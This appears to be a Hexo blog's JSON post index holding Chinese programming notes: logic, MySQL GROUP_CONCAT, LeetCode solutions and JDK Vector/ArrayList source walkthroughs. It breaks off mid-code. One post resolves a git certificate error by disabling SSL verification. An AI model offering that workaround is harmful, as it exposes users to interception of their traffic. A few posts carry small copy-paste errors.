如果p&lt;-&gt;q是永真式，命题p和q称为是逻辑等价的。记号p三q表示p和q逻辑等价。符号三不是逻辑联接词，因为p三q不是复合命题，而语句p←→q是永真式。符号&lt;=&gt;有时用来代替三表示等价。 证明 ¬(p∨q) 和 ¬p∧¬q 利用真值表证明. p q p∨q ¬(p∨q) ¬p ¬q ¬p∧¬q 0 0 0 1 1 1 1 0 1 1 0 1 0 0 1 0 1 0 0 1 0 1 1 1 0 0 0 0 谓词和量词 当命题函数中所有变量均被赋值时，得到的命题有一个具值。还有另一里安力式，也可以从命题函数产生命题，这就是量化。量化表示谓词在一定范围的事物上成立的程度。在语言中，单词“所有”、“一些”、“许多”、“没有”，以及“没几个”被用于量化。这里讨论两类量化:全称量化，它告诉我们一个谓词在所考虑的每- -对象中都为真;存在量化，它告诉我们一个谓词对所考虑中的一个或多个对象成真。处理谓词和量词的逻辑领域称为谓词演算。全称量词 许多数学命题对于某一性质在变量的某一特定域内的所有值均为真，这一特定域称为变量的论域(或全体域)，时常简单地称为域。这类语句用全称量化表示。P(x)对特定论域的全称量化是指:它断言P(x)对x在其论域中的所有值为真。注意,论域是变量x所有可能指定的值。 当我们改变论域时，P(x) 的全称量化的意义也随之改变。 在用全称量词时，必须指定论域，否则语句的全称量词无意义。 嵌套量词推理规则证明导论证明的方法和策略参考资料 &lt;离散数学及其应用原书第六版&gt;","updated":"2020-07-19T00:23:27.985Z","tags":[{"name":"数学","slug":"数学","permalink":"http://xwolf191.github.io/tags/数学/"}]},{"title":"MySQL group_concat函数详解","date":"2018-06-15T06:30:00.000Z","path":"2018/06/15/数据库/mysql/MySQL group_concat函数详解/","text":"以Mysql5.7为例.group_concat属于聚合函数的一种.group_concat是返回结果集合用”,”拼接,如果为空值返回null. 基本用法 语法 12345GROUP_CONCAT([DISTINCT] expr [,expr ...] [ORDER BY &#123;unsigned_integer | col_name | expr&#125; [ASC | DESC] [,col_name ...]] [SEPARATOR str_val]) 示例 查看所有数据 1SELECT * FROM sys_user; id uname age 1 a (NULL) 2 a (NULL) 3 b (NULL) 4 d (NULL) 5 c (NULL) 6 e (NULL) 7 g (NULL) 8 f (NULL) 9 f (NULL) 将用户名拼接返回 1SELECT GROUP_CONCAT(uname) FROM sys_user ; group_concat(uname) a,a,b,d,c,e,g,f,f 3.用户名去重后拼接排序 1SELECT GROUP_CONCAT(DISTINCT uname ORDER BY uname ASC) FROM sys_user ; GROUP_CONCAT(distinct uname order by uname ASC) a,b,c,d,e,f,g 用户名用指定连接符拼接 1SELECT GROUP_CONCAT(DISTINCT uname ORDER BY uname SEPARATOR '|') FROM sys_user ; GROUP_CONCAT(DISTINCT uname ORDER BY uname SEPARATOR ‘|’) a|b|c|d|e|f|g 注意 group_concat默认长度为1024,如果长度超过默认长度会截取返回。根据业务需要,更改长度即可. 1SET [GLOBAL | SESSION] group_concat_max_len = val; 返回值是非二进制或二进制字符串，具体取决于参数是非二进制还是二进制字符串。结果类型为TEXT或BLOB,除非group_concat_max_len小于或等于512,在这种情况下,结果类型为VARCHAR或VARBINARY. 参考资料 Mysql官网group_concat","updated":"2020-07-19T00:23:28.013Z","tags":[{"name":"mysql","slug":"mysql","permalink":"http://xwolf191.github.io/tags/mysql/"}]},{"title":"151. Reverse Words in a String","date":"2018-06-07T03:00:00.000Z","path":"2018/06/07/数据结构和算法/leetcode/Reverse Words in a String/","text":"Given an input string, reverse the string word by word.Example:Input: “the sky is blue”,Output: “blue is sky the”.Note:A word is defined as a sequence of non-space characters.Input string may contain leading or trailing spaces. However, your reversed string should not contain leading or trailing spaces.You need to reduce multiple spaces between two words to a single space in the reversed string.Follow up: For C programmers, try to solve it in-place in O(1) space. 题目解读给的字符串,根据单词来翻转.其中不能有连续的空格,如果有保留一个,前后空格不能存在. 实现 java 利用正则表达式将前后空格删除,根据正则两多个空格删除,保留一个空格.12345678910public static String reverseWords(String s) &#123; StringBuilder builder = new StringBuilder(s.trim().replaceAll(\"\\r|\\n|\\\\s+\",\" \")); String[] arys = builder.toString().split(\" \"); StringBuilder b = new StringBuilder(); int length = arys.length; for (int i=length-1;i&gt;=0;i--)&#123; b.append(arys[i]).append(\" \"); &#125; return b.toString().trim(); &#125; go 1234567891011121314151617181920212223package leetcodeimport ( \"strings\" \"fmt\")func Reverse(s string) string &#123; str := strings.TrimSpace(s) strAry := strings.Split(str,\" \") fmt.Println(strAry) size := len(strAry) - 1 res := \"\" for i:=size ;i &gt;= 0 ; i-- &#123; if len(strAry[i])&gt; 0&#123; res += strAry[i] if i!=0 &#123; res += \" \" &#125; &#125; &#125; return res&#125; 讨论区其他答案 go 12345678910func reverseWords(s string) string &#123; fields := strings.Fields(s) var reverses []string for i := len(fields)-1; i &gt;= 0; i-- &#123; reverses = append(reverses, fields[i]) &#125; return strings.Join(reverses, \" \")&#125; java java两个指针来解决问题 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class Solution &#123; public String reverseWords(String s) &#123; if (s == null) return null; char[] a = s.toCharArray(); int n = a.length; // step 1. reverse the whole string reverse(a, 0, n - 1); // step 2. reverse each word reverseWords(a, n); // step 3. clean up spaces return cleanSpaces(a, n); &#125; void reverseWords(char[] a, int n) &#123; int i = 0, j = 0; while (i &lt; n) &#123; while (i &lt; j || i &lt; n &amp;&amp; a[i] == ' ') i++; // skip spaces while (j &lt; i || j &lt; n &amp;&amp; a[j] != ' ') j++; // skip non spaces reverse(a, i, j - 1); // reverse the word &#125; &#125; // trim leading, trailing and multiple spaces String cleanSpaces(char[] a, int n) &#123; int i = 0, j = 0; while (j &lt; n) &#123; while (j &lt; n &amp;&amp; a[j] == ' ') j++; // skip spaces while (j &lt; n &amp;&amp; a[j] != ' ') a[i++] = a[j++]; // keep non spaces while (j &lt; n &amp;&amp; a[j] == ' ') j++; // skip spaces if (j &lt; n) a[i++] = ' '; // keep only one space &#125; return new String(a).substring(0, i); &#125; // reverse a[] from a[i] to a[j] private void reverse(char[] a, int i, int j) &#123; while (i &lt; j) &#123; char t = a[i]; a[i++] = a[j]; a[j--] = t; &#125; &#125; &#125; CPP 1234567891011121314void reverseWords(string &amp;s) &#123; reverse(s.begin(), s.end()); int storeIndex = 0; for (int i = 0; i &lt; s.size(); i++) &#123; if (s[i] != ' ') &#123; if (storeIndex != 0) s[storeIndex++] = ' '; int j = i; while (j &lt; s.size() &amp;&amp; s[j] != ' ') &#123; s[storeIndex++] = s[j++]; &#125; reverse(s.begin() + storeIndex - (j - i), s.begin() + storeIndex); i = j; &#125; &#125; s.erase(s.begin() + storeIndex, s.end());&#125; 参考 Reverse Words in a String 如有错误,欢迎批评指正,望不吝赐教!!!","updated":"2020-07-19T00:23:28.037Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"189. Rotate Array","date":"2018-06-06T12:00:00.000Z","path":"2018/06/06/数据结构和算法/leetcode/Rotate Array/","text":"Given an array, rotate the array to the right by k steps, where k is non-negative. Example 1: Input: [1,2,3,4,5,6,7] and k = 3Output: [5,6,7,1,2,3,4]Explanation:rotate 1 steps to the right: [7,1,2,3,4,5,6]rotate 2 steps to the right: [6,7,1,2,3,4,5]rotate 3 steps to the right: [5,6,7,1,2,3,4]Example 2:Input: [-1,-100,3,99] and k = 2Output: [3,99,-1,-100]Explanation:rotate 1 steps to the right: [99,-1,-100,3]rotate 2 steps to the right: [3,99,-1,-100]Note:Try to come up as many solutions as you can, there are at least 3 different ways to solve this problem.Could you do it in-place with O(1) extra space? 题意解读题意是将一个数组按照给定的数字截取反转,要求时间复杂度为O(1)。解题思路需要数组的移动,每次将最后一个元素取出来赋值到数组第一个元素位置。 实现 python 12345678910111213141516171819202122232425262728293031# coding=utf-8# author: xwolf# origin: https://leetcode.com/problems/rotate-array/description/# date: 2018-08-10class RoateArray(object): def __init__(self): pass @staticmethod def roate(nums, k): \"\"\" :param nums: :param k: :return: \"\"\" c = len(nums) - k a = nums[0:c] b = nums[c:len(nums)] nums[0:k] = b nums[k:] = a return numsif __name__ == '__main__': rate = RoateArray() a = [-1, -100, 3, 99] print(rate.roate(a, 2)) 参考 189. Rotate Array","updated":"2020-07-19T00:23:28.038Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"125. Valid Palindrome","date":"2018-06-05T02:00:00.000Z","path":"2018/06/05/数据结构和算法/leetcode/Valid Palindrome/","text":"Given a string, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases.Note: For the purpose of this problem, we define empty string as valid palindrome.Example 1:Input: “A man, a plan, a canal: Panama”Output: trueExample 2:Input: “race a car”Output: false 题目描述 判断字符串是否是回文,题目要点是仅考虑字母数字字符且忽略大小写. 实现 scala 实现 scala 正则替换非字母数字字符串 12345def isPalindrome(s: String): Boolean = &#123; if (s==null) return false val str = s.replaceAll(\"[^0-9a-zA-Z]\",\"\") str.equalsIgnoreCase(str.reverse) &#125; 参考 Valid Palindrome 如有错误,欢迎批评指正,望不吝赐教!!!","updated":"2020-07-19T00:23:28.043Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"设计模式之构建器模式","date":"2018-06-04T02:00:00.000Z","path":"2018/06/04/java/designpattern/设计模式之构建器模式/","text":"构建器模式(建造者模式/Builder模式),是将一个复杂对象的构建和它的表示分离,使得同样的构建过程可以创建不同的表示.","updated":"2020-07-19T00:23:27.853Z","tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://xwolf191.github.io/tags/设计模式/"}]},{"title":"java集合源码分析之LinkedList","date":"2018-06-03T01:40:00.000Z","path":"2018/06/03/java/java集合源码分析之LinkedList/","text":"源码分析以JDK1.8为例. ArrayList就是动态数组,就是Array的复杂版本.它提供了动态的增加和减少元素,实现了Collection和List接口,灵活的设置数组的大小等好处.UML图如下: 源码解读公共属性12345678910111213141516171819 //元素个数transient int size = 0; /** 指向第一个节点 * Pointer to first node. * Invariant: (first == null &amp;&amp; last == null) || * (first.prev == null &amp;&amp; first.item != null) */ transient Node&lt;E&gt; first; /** * 指向最后一个节点 * Pointer to last node. * Invariant: (first == null &amp;&amp; last == null) || * (last.next == null &amp;&amp; last.item != null) */ transient Node&lt;E&gt; last;","updated":"2020-07-19T00:23:27.862Z","tags":[{"name":"java","slug":"java","permalink":"http://xwolf191.github.io/tags/java/"}]},{"title":"java集合源码分析之Vector","date":"2018-06-03T01:40:00.000Z","path":"2018/06/03/java/java集合源码分析之Vector/","text":"源码分析以JDK1.8为例.Vector是线程安全的动态数组的实现.UML图 源码解读公共属性 1234567891011121314151617181920//元素数组protected Object[] elementData;//元素数量protected int elementCount; /** * The amount by which the capacity of the vector is automatically * incremented when its size becomes greater than its capacity. If * the capacity increment is less than or equal to zero, the capacity * of the vector is doubled each time it needs to grow. * * @serial *///扩容基数 protected int capacityIncrement;//默认最大元素个数private static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8; 构造器 1234567891011121314151617181920212223242526272829//默认初始容量10 public Vector() &#123; this(10); &#125;//指定容量初始化 public Vector(int initialCapacity) &#123; this(initialCapacity, 0); &#125;//指定初始容量和容量增加数来初始化vectorpublic Vector(int initialCapacity, int capacityIncrement) &#123; super(); if (initialCapacity &lt; 0) throw new IllegalArgumentException(\"Illegal Capacity: \"+ initialCapacity); //元素数组初始化 this.elementData = new Object[initialCapacity]; this.capacityIncrement = capacityIncrement; &#125; //用集合初始化数组 public Vector(Collection&lt;? extends E&gt; c) &#123; elementData = c.toArray(); elementCount = elementData.length; // c.toArray might (incorrectly) not return Object[] (see 6260652) if (elementData.getClass() != Object[].class) elementData = Arrays.copyOf(elementData, elementCount, Object[].class); &#125; add 12345678910111213141516171819202122232425262728293031323334353637 public synchronized boolean add(E e) &#123; //修改次数加1 modCount++; //扩容 ensureCapacityHelper(elementCount + 1); //将元素追加到数组后 elementData[elementCount++] = e; return true; &#125; private void ensureCapacityHelper(int minCapacity) &#123; //如果指定容量超过元素数组的长度,则开始扩容 if (minCapacity - elementData.length &gt; 0) grow(minCapacity); &#125; private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; //如果扩容基数大于0,每次扩容指定的基数,否则扩容两倍 int newCapacity = oldCapacity + ((capacityIncrement &gt; 0) ? capacityIncrement : oldCapacity); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); elementData = Arrays.copyOf(elementData, newCapacity); &#125; //取最大容量private static int hugeCapacity(int minCapacity) &#123; if (minCapacity &lt; 0) // overflow throw new OutOfMemoryError(); return (minCapacity &gt; MAX_ARRAY_SIZE) ? Integer.MAX_VALUE : MAX_ARRAY_SIZE; &#125; add(int index, E element) 指定索引位置插入元素 123456789101112131415161718192021public void add(int index, E element) &#123; insertElementAt(element, index); &#125; public synchronized void insertElementAt(E obj, int index) &#123; //修改次数加1 modCount++; //边界检查 if (index &gt; elementCount) &#123; throw new ArrayIndexOutOfBoundsException(index + \" &gt; \" + elementCount); &#125; //扩容 ensureCapacityHelper(elementCount + 1); //将index后的元素后移 System.arraycopy(elementData, index, elementData, index + 1, elementCount - index); //指定位置赋值 elementData[index] = obj; //元素个数加1 elementCount++; &#125; addAll(Collection&lt;? extends E&gt; c) 插入整个集合 1234567891011121314public synchronized boolean addAll(Collection&lt;? extends E&gt; c) &#123; //修改次数加1 modCount++; Object[] a = c.toArray(); int numNew = a.length; //扩容 ensureCapacityHelper(elementCount + numNew); //将a元素全部复制到目标数组中 System.arraycopy(a, 0, elementData, elementCount, numNew); //元素个数增加指定集合的个数 elementCount += numNew; //添加的集合不为空返回true return numNew != 0; &#125; addAll(int index, Collection&lt;? extends E&gt; c) 指定索引添加数组 12345678910111213141516171819202122232425public synchronized boolean addAll(int index, Collection&lt;? extends E&gt; c) &#123; //修改次数加1 modCount++; //边界检查 if (index &lt; 0 || index &gt; elementCount) throw new ArrayIndexOutOfBoundsException(index); Object[] a = c.toArray(); int numNew = a.length; //扩容 ensureCapacityHelper(elementCount + numNew); //需要移动元素的个数 int numMoved = elementCount - index; //要移动的元素的个数大于0,则将索引后的元素后移 if (numMoved &gt; 0) System.arraycopy(elementData, index, elementData, index + numNew, numMoved); //将集合参数复制到目标数组中 System.arraycopy(a, 0, elementData, index, numNew); //增加元素个数 elementCount += numNew; //添加的集合不为空返回true return numNew != 0; &#125; copyInto(Object[] anArray) 将所有元素复制到给定数组参数中 123public synchronized void copyInto(Object[] anArray) &#123; System.arraycopy(elementData, 0, anArray, 0, elementCount); &#125; set(int index, E element) 将指定索引位置的元素重新赋值,返回旧值 12345678public synchronized E set(int index, E element) &#123; if (index &gt;= elementCount) throw new ArrayIndexOutOfBoundsException(index); E oldValue = elementData(index); elementData[index] = element; return oldValue; &#125; get(int index) 获取指定索引位置的元素 123456public synchronized E get(int index) &#123; if (index &gt;= elementCount) throw new ArrayIndexOutOfBoundsException(index); return elementData(index); &#125; indexOf(Object o) 获取指定元素的索引 1234567891011121314151617public int indexOf(Object o) &#123; return indexOf(o, 0); &#125;//从指定索引位置开始查找指定元素的索引 public synchronized int indexOf(Object o, int index) &#123; if (o == null) &#123; for (int i = index ; i &lt; elementCount ; i++) if (elementData[i]==null) return i; &#125; else &#123; for (int i = index ; i &lt; elementCount ; i++) if (o.equals(elementData[i])) return i; &#125; return -1; &#125; lastIndexOf(Object o) 指定元素最后出现的索引位置 12345678910111213141516171819public synchronized int lastIndexOf(Object o) &#123; return lastIndexOf(o, elementCount-1); &#125;public synchronized int lastIndexOf(Object o, int index) &#123; if (index &gt;= elementCount) throw new IndexOutOfBoundsException(index + \" &gt;= \"+ elementCount); if (o == null) &#123; for (int i = index; i &gt;= 0; i--) if (elementData[i]==null) return i; &#125; else &#123; for (int i = index; i &gt;= 0; i--) if (o.equals(elementData[i])) return i; &#125; return -1; &#125; remove(Object o) 删除指定元素 12345678910111213141516171819202122232425262728293031323334public boolean remove(Object o) &#123; return removeElement(o); &#125; public synchronized boolean removeElement(Object obj) &#123; modCount++; int i = indexOf(obj); if (i &gt;= 0) &#123; removeElementAt(i); return true; &#125; return false; &#125; public synchronized void removeElementAt(int index) &#123; modCount++; if (index &gt;= elementCount) &#123; throw new ArrayIndexOutOfBoundsException(index + \" &gt;= \" + elementCount); &#125; else if (index &lt; 0) &#123; throw new ArrayIndexOutOfBoundsException(index); &#125; //移动的长度 int j = elementCount - index - 1; //将索引后的元素前移 if (j &gt; 0) &#123; System.arraycopy(elementData, index + 1, elementData, index, j); &#125; //元素个数减1 elementCount--; //最后一个元素设置为null elementData[elementCount] = null; /* to let gc do its work */ &#125; remove(int index) 删除指定索引的元素,返回被移除的元素 123456789101112131415public synchronized E remove(int index) &#123; modCount++; if (index &gt;= elementCount) throw new ArrayIndexOutOfBoundsException(index); E oldValue = elementData(index); //移动元素的个数 int numMoved = elementCount - index - 1; if (numMoved &gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); //将最后的元素设置为null elementData[--elementCount] = null; // Let gc do its work return oldValue; &#125; removeAll(Collection&lt;?&gt; c) 将指定集合的元素删除 12345678910111213141516public synchronized boolean removeAll(Collection&lt;?&gt; c) &#123; return super.removeAll(c); &#125;public boolean removeAll(Collection&lt;?&gt; c) &#123; Objects.requireNonNull(c); boolean modified = false; Iterator&lt;?&gt; it = iterator(); while (it.hasNext()) &#123; if (c.contains(it.next())) &#123; it.remove(); modified = true; &#125; &#125; return modified; &#125; java removeRange(int fromIndex, int toIndex) 将指定索引区间的元素删除 1234567891011121314protected synchronized void removeRange(int fromIndex, int toIndex) &#123; modCount++; //移动数组 int numMoved = elementCount - toIndex; System.arraycopy(elementData, toIndex, elementData, fromIndex, numMoved); // Let gc do its work int newElementCount = elementCount - (toIndex-fromIndex); //将最后的元素设置为null while (elementCount != newElementCount) elementData[--elementCount] = null; &#125; subList(int fromIndex, int toIndex) 截取子序列 1234567891011121314151617181920212223242526272829303132//获取同步子List public synchronized List&lt;E&gt; subList(int fromIndex, int toIndex) &#123; return Collections.synchronizedList(super.subList(fromIndex, toIndex), this); &#125;static &lt;T&gt; List&lt;T&gt; synchronizedList(List&lt;T&gt; list, Object mutex) &#123; return (list instanceof RandomAccess ? new SynchronizedRandomAccessList&lt;&gt;(list, mutex) : new SynchronizedList&lt;&gt;(list, mutex)); &#125; class SubList&lt;E&gt; extends AbstractList&lt;E&gt; &#123; private final AbstractList&lt;E&gt; l; private final int offset; private int size; SubList(AbstractList&lt;E&gt; list, int fromIndex, int toIndex) &#123; if (fromIndex &lt; 0) throw new IndexOutOfBoundsException(\"fromIndex = \" + fromIndex); if (toIndex &gt; list.size()) throw new IndexOutOfBoundsException(\"toIndex = \" + toIndex); if (fromIndex &gt; toIndex) throw new IllegalArgumentException(\"fromIndex(\" + fromIndex + \") &gt; toIndex(\" + toIndex + \")\"); l = list; offset = fromIndex; size = toIndex - fromIndex; this.modCount = l.modCount; &#125;&#125; removeIf(Predicate&lt;? super E&gt; filter) 根据函数式条件移除元素 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051@Override @SuppressWarnings(\"unchecked\") public synchronized boolean removeIf(Predicate&lt;? super E&gt; filter) &#123; Objects.requireNonNull(filter); // figure out which elements are to be removed // any exception thrown from the filter predicate at this stage // will leave the collection unmodified int removeCount = 0; final int size = elementCount; //创建位图 final BitSet removeSet = new BitSet(size); final int expectedModCount = modCount; for (int i=0; modCount == expectedModCount &amp;&amp; i &lt; size; i++) &#123; @SuppressWarnings(\"unchecked\") final E element = (E) elementData[i]; if (filter.test(element)) &#123; removeSet.set(i); removeCount++; &#125; &#125; //fail-fast 快速失败机制 if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125; // shift surviving elements left over the spaces left by removed elements //是否有需要移除的元素 final boolean anyToRemove = removeCount &gt; 0; if (anyToRemove) &#123; final int newSize = size - removeCount; //重新赋值,跳过移除的元素 for (int i=0, j=0; (i &lt; size) &amp;&amp; (j &lt; newSize); i++, j++) &#123; i = removeSet.nextClearBit(i); elementData[j] = elementData[i]; &#125; //将移除后的元素重置为null for (int k=newSize; k &lt; size; k++) &#123; elementData[k] = null; // Let gc do its work &#125; //元素数量修改 elementCount = newSize; //fail-fast 快速失败机制 if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125; //修改次数累加 modCount++; &#125; return anyToRemove; &#125; 测试例子 1234567891011121314151617181920212223242526272829 /* *删除大于1的元素 */ @Test public void test()&#123; Vector&lt;Integer&gt; vector = new Vector&lt;&gt;(); vector.add(1); vector.add(2); vector.removeIf(a -&gt; a&gt;1); System.out.println(vector); &#125; //位图测试 @Test public void testBitSet()&#123; BitSet bitSet = new BitSet(4); bitSet.set(2); bitSet.set(3); for (int i=0;i&lt;5;i++)&#123; int j = bitSet.nextClearBit(i); System.out.println(j); &#125; &#125; 输出结果:01444 sort sort 依然是归并排序和TimSort 12345678910@SuppressWarnings(\"unchecked\") @Override public synchronized void sort(Comparator&lt;? super E&gt; c) &#123; final int expectedModCount = modCount; Arrays.sort((E[]) elementData, 0, elementCount, c); if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125; modCount++; &#125; 总结 初始容量为10 动态扩容容量为指定容量或者2倍 随机查找效率较高 插入和删除慢,需要移动元素 排序用归并排序和TimSort 动态删除元素会抛出异常,可用迭代器实现 线程安全 如有错误,欢迎批评指正,望不吝赐教!!!","updated":"2020-07-19T00:23:27.863Z","tags":[{"name":"java","slug":"java","permalink":"http://xwolf191.github.io/tags/java/"}]},{"title":"104. Maximum Depth of Binary Tree","date":"2018-06-01T09:00:00.000Z","path":"2018/06/01/数据结构和算法/leetcode/Maximum Depth of Binary Tree/","text":"Given a binary tree, find its maximum depth.The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.Note: A leaf is a node with no children.Example:Given binary tree [3,9,20,null,null,15,7], 3 / \\ 9 20 / \\ 15 7return its depth = 3. 题目描述 求二叉树的深度 实现 scala 1234def maxDepth(root: TreeNode): Int = &#123; if (root == null) return 0 Math.max(maxDepth(root.left), maxDepth(root.right)) + 1 &#125; 参考 Maximum Depth of Binary Tree 如有错误,欢迎批评指正,望不吝赐教!!!","updated":"2020-07-19T00:23:28.030Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"SSL certificate problem：unable to get local issuer certificate","date":"2018-06-01T06:30:00.000Z","path":"2018/06/01/开发工具/SSL certificate problem/","text":"12345D:\\workspace\\IDEA&gt; git pullfatal: unable to access 'https://github.com/XXXX': SSL certificate problem: unable to get local issuer certificateD:\\workspace\\IDEA&gt; git config http.sslVerify false","updated":"2020-07-19T00:23:27.967Z","tags":[{"name":"git","slug":"git","permalink":"http://xwolf191.github.io/tags/git/"}]},{"title":"67.Add Binary","date":"2018-05-31T23:20:00.000Z","path":"2018/06/01/数据结构和算法/leetcode/Add Binary/","text":"Given two binary strings, return their sum (also a binary string).The input strings are both non-empty and contains only characters 1 or 0.Example 1:Input: a = “11”, b = “1”Output: “100”Example 2:Input: a = “1010”, b = “1011”Output: “10101” 题目描述 题意是两个二进制字符串,返回它们的和(仍然是二进制串).二进制数字可能比较长,考虑到选择数据类型的范围. 实现 scala 实现12345def addBinary(a: String, b: String): String = &#123; val c = BigInt(a,2) val d = BigInt(b,2) (c + d).toString(2) &#125; 参考 Add Binary 如有错误,欢迎批评指正,望不吝赐教!!!","updated":"2020-07-19T00:23:28.020Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"java集合源码分析之ArrayList","date":"2018-05-31T07:30:00.000Z","path":"2018/05/31/java/java集合源码分析之ArrayList/","text":"源码分析以JDK1.8为例. ArrayList就是动态数组,就是Array的复杂版本.它提供了动态的增加和减少元素,实现了Collection和List接口,灵活的设置数组的大小等好处.UML图如下: 源码解读公共属性 12345678910111213141516171819 //默认容量 private static final int DEFAULT_CAPACITY = 10; // 空数据 private static final Object[] EMPTY_ELEMENTDATA = &#123;&#125;; //默认容量空数组 private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;; //保存数据的数组 transient Object[] elementData; //元素个数 private int size;//最大数组长度//一些虚拟机会在数组头部保存头信息,占用更多空间,导致OOMprivate static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8; 无参构造器 1234//初始化一个空数组public ArrayList() &#123; this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA; &#125; int 构造器 指定初始容量,大于0直接初始化;等于0初始化一个空数组,小于0抛出异常。 12345678910public ArrayList(int initialCapacity) &#123; if (initialCapacity &gt; 0) &#123; this.elementData = new Object[initialCapacity]; &#125; else if (initialCapacity == 0) &#123; this.elementData = EMPTY_ELEMENTDATA; &#125; else &#123; throw new IllegalArgumentException(\"Illegal Capacity: \"+ initialCapacity); &#125; &#125; 集合构造器 集合参数转化为对象数组赋值给元素集合,如果有元素判断集合类型,如果不是Object[] 执行集合复制转化为Object[].没有元素直接返回空集合.123456789101112public ArrayList(Collection&lt;? extends E&gt; c) &#123; //转化为数组 elementData = c.toArray(); if ((size = elementData.length) != 0) &#123; // c.toArray might (incorrectly) not return Object[] (see 6260652) if (elementData.getClass() != Object[].class) elementData = Arrays.copyOf(elementData, size, Object[].class); &#125; else &#123; //初始化为空集合 this.elementData = EMPTY_ELEMENTDATA; &#125; &#125; 有一个注释,c.toArray 可能不会返回Object[].让参考bug编号6260652.到oracle 官网查看bughttps://bugs.java.com/bugdatabase/view_bug.do?bug_id=6260652 大意就是Arrays.asList 创建集合,再调用toArray返回的对象不是Object[]类型。测试一下看看: 12345678910111213public void test()&#123; List&lt;Integer&gt; obj = new ArrayList&lt;&gt;(); obj.add(32); obj.add(344); List&lt;Integer&gt; ls = new ArrayList&lt;&gt;(obj); System.out.println(ls.size()); Object[] c = obj.toArray(); System.out.println(c.getClass()); System.out.println(Object[].class); //Arrays.asList创建 List&lt;Integer&gt; d = Arrays.asList(3,2,3); System.out.println(d.toArray().getClass()); &#125; 12342class [Ljava.lang.Object;class [Ljava.lang.Object;class [Ljava.lang.Integer; 可见Arrays.asList 返回的是Integer[],并非Object[].查看Arrays相关源码 123456//初始化ArrayList@SafeVarargs@SuppressWarnings(\"varargs\")public static &lt;T&gt; List&lt;T&gt; asList(T... a) &#123; return new ArrayList&lt;&gt;(a);&#125; 此处的ArrayList为Arrays的内部类. 123456789101112131415161718192021222324252627282930313233343536private static class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; implements RandomAccess, java.io.Serializable &#123; private static final long serialVersionUID = -2764017481108945198L; //泛型数组 private final E[] a; //初始化 ArrayList(E[] array) &#123; a = Objects.requireNonNull(array); &#125; @Override public int size() &#123; return a.length; &#125; //调用a的clone方法 @Override public Object[] toArray() &#123; return a.clone(); &#125; @Override @SuppressWarnings(\"unchecked\") public &lt;T&gt; T[] toArray(T[] a) &#123; int size = size(); if (a.length &lt; size) return Arrays.copyOf(this.a, size, (Class&lt;? extends T[]&gt;) a.getClass()); System.arraycopy(this.a, 0, a, 0, size); if (a.length &gt; size) a[size] = null; return a; &#125;&#125; 官方显示,JDK9已经解决。扩展一下,查看数组的clone方法,length属性的实现.12345678910public void test()&#123; int [] a = &#123;1,2,3&#125;; System.out.println(a.length);&#125;public static void test2()&#123; Integer[] f = &#123;3,4&#125;; f.clone();&#125; 查看byte code12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class com.xwolf.ArrayListTest &#123; public com.xwolf.ArrayListTest(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.\"&lt;init&gt;\":()V 4: return public void test(); Code: 0: iconst_3 1: newarray int 3: dup 4: iconst_0 5: iconst_1 6: iastore 7: dup 8: iconst_1 9: iconst_2 10: iastore 11: dup 12: iconst_2 13: iconst_3 14: iastore 15: astore_1 16: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 19: aload_1 20: arraylength 21: invokevirtual #3 // Method java/io/PrintStream.println:(I)V 24: return public static void test2(); Code: 0: iconst_2 1: anewarray #4 // class java/lang/Integer 4: dup 5: iconst_0 6: iconst_3 7: invokestatic #5 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer; 10: aastore 11: dup 12: iconst_1 13: iconst_4 14: invokestatic #5 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer; 17: aastore 18: astore_0 19: aload_0 20: invokevirtual #6 // Method \"[Ljava/lang/Integer;\".clone:()Ljava/lang/Object; 23: pop 24: return public static void main(java.lang.String[]); Code: 0: invokestatic #7 // Method test2:()V 3: return&#125; 此处不展开,arraylength、invokevirtual参考官网java虚拟机规范https://docs.oracle.com/javase/specs/jvms/se8/html/index.html. add方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152//List后追加元素public boolean add(E e) &#123; //扩容 ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true; &#125; private void ensureCapacityInternal(int minCapacity) &#123; ensureExplicitCapacity(ca lculateCapacity(elementData, minCapacity)); &#125;//计算容量,元素为空返回默认容量和容量的最大值 private static int calculateCapacity(Object[] elementData, int minCapacity) &#123; if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123; return Math.max(DEFAULT_CAPACITY, minCapacity); &#125; return minCapacity; &#125; //扩容到指定容量,修改次数modCount加1 private void ensureExplicitCapacity(int minCapacity) &#123; //增加修改次数 modCount++; if (minCapacity - elementData.length &gt; 0) grow(minCapacity); &#125;private void grow(int minCapacity) &#123; //old容量为元素数组的元素个数 int oldCapacity = elementData.length; // 扩容至 old + (old/2) int newCapacity = oldCapacity + (oldCapacity 